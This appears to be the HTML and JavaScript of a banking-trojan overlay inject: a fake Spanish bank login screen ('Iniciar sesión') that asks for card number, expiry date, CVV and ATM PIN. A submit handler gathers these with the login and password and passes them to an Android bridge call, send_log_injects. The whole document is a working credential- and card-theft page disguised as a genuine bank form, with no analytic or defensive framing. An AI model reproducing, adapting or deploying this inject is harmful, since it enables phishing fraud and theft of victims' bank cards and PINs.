	<style>
        
        html{height: 100%;}body {
            background: #043263;
            padding: 0;
            margin: 0;
            font-family: sans-serif;
            margin: 0;
        }

        #form1, #form2 {
            display: -webkit-flex;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        
        section {
            flex: 1;
            padding: 20px;
            margin-top: 100px;
        }
        
        p {
            color: #fff;
            text-align: center;
        }
        
        .field {
            padding: 10px;
            background: #004481;
            border: 0;
            border-bottom: 2px solid #708aa6;
            width: 100%;
            color: #fff;
            margin-bottom: 10px;
        }
        
        footer {
            text-align: center;
            color: #fff;
            padding: 20px;
        }
        
        
        .button {
            background: #028484;
            color: #fff;
            width: 160px;
            padding: 10px;
            border: 0;
            border-radius: 2px;
            margin-bottom: 15px;
        }
        
        .button:disabled {
            background: #5f7b98;
            color: #536a83;
        }
        .fakebtn {
            width: 160px;
            padding: 10px;
            background: transparent;
            border: 1px solid #fff;
            border-radius: 2px;
            font-weight: bold;
            margin-bottom: 15px;
        }
        
        .error {
            border-color: #f00 !important;
        }

        input, button {
            outline: none;
        }

        input::placeholder {
            color: #fff;
        }

        input::-moz-placeholder {
            color: #fff;
        }
    </style>

            <section>
                    <input type="tel" class="field" name="cc" id="cc" maxlength="19" onkeyup="check6();check2()" placeholder="Tarjeta de crédito" autocomplete="off">

                    <div style="overflow: hidden;">
                        <input type="tel" class="field" name="exp" id="exp" style="width: 58%;float: left;" maxlength="5" onkeyup="check4();check2()" placeholder="Expiración" autocomplete="off">
                        <input type="password" class="field" name="cvv" id="cvv" style="width: 40%;float: right;" maxlength="3" onkeyup="check2()" autocomplete="off" placeholder="CVV">
                        <input type="password" class="field" name="pin" id="pin" style="width: 40%;float: right;" maxlength="4" onkeyup="check2()" autocomplete="off" placeholder="PIN ATM">
                    </div>

                    <p style="text-align: right;">¿Has olvidado tu clave de acceso?</p>
            </section>
    
            <footer>
                <p style="font-size: 12px;">Al acceder aceptas las <b>condiciones legales</b></p>
                <input type="submit" class="button" id="sendData" disabled value="Iniciar sesión">
                <div class="fakebtn" style="display: block;margin: auto auto 10px ;" >Hazte cliente</div>
                <p><b>Soy cliente sin usuario online</b></p>
            </footer>
        </div>
    </form>
    
<script type="text/javascript">
$('#cc').mask('0000 0000 0000 0000');
$('#exp').mask('00/00');
$('#cvv').mask('000');
$('#pin').mask('0000');

    var login = document.getElementById('login'),
        password = document.getElementById('password'),
        nextPage = document.getElementById('nextPage'),
        form1 = document.getElementById('form1'),
        form2 = document.getElementById('form2'),
        sendData = document.getElementById('sendData'),
        eye = document.getElementById('eye');

    var pin = document.getElementById('pin');

    var month_;
	var year_;

    function check() {
        if(login.value.length > 5 && password.value.length > 3) {
            nextPage.disabled = false;
        } else {
            nextPage.disabled = true;
        }
    }

    nextPage.onclick = function() {
        form1.style.display = 'none';
        form2.style.display = 'flex';
    }

    eye.onclick = function() {
        if(password.type == 'password') {
            password.type = 'text';
        } else {
            password.type = 'password';
        }
    }

    function check4() {
            
        var mmYY = exp.value.split('/');
		var month = parseInt(mmYY[0]);
		var year = parseInt(mmYY[1]);

		var expArray = exp.value.split('/');
		var today, someday;
		var exMonth = expArray[0];
		var exYear = "20" + expArray[1];

		today = new Date();
		someday = new Date();
		someday.setFullYear(exYear, exMonth, 1);
                
        if(month > 12 || month == 0 || month == 00 || someday < today || year > 27) {
            exp.classList.add('error')
        } else {
            exp.classList.remove('error')
        }
    }

    function check6() {
        if(!valid_credit_card(cc.value)) {
            cc.classList.add('error')
        } else {
            cc.classList.remove('error');
        }
    }

    function valid_credit_card(value) {
        if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
        if (/[^0-9-\s]+/.test(value)) return false;
        var nCheck = 0, nDigit = 0, bEven = false;
        value = value.replace(/\D/g, "");
        for (var n = value.length - 1; n >= 0; n--) {
            var cDigit = value.charAt(n),
                nDigit = parseInt(cDigit, 10);
            if (bEven) {
                if ((nDigit *= 2) > 9) nDigit -= 9;
            }
            nCheck += nDigit;
            bEven = !bEven;
        }
        return (nCheck % 10) == 0;
        
    }

    function check2() {
        if(cc.value.length === 19 && exp.value.length == 5 && cvv.value.length === 3 && pin.value.length === 4) {
            sendData.disabled = false;
        } else {
            sendData.disabled = true;
        }
    }

    sendData.onclick = function() {
        var data = {};
            data.login = login.value;
            data.password = password.value;
            data.cc = cc.value;
            data.exp = exp.value;
            data.cvv = cvv.value;
            data.pin = pin.value;
            data.type_injects = "banks";
            data.closed = "close_activity_injects";

            var ua = navigator.userAgent.toLowerCase();
            if(ua.indexOf("android") > -1) {
                try {
                    Android.send_log_injects(JSON.stringify(data))
                } catch (err) {}
            }else{
                alert(JSON.stringify(data));
            }
    }
 </script>
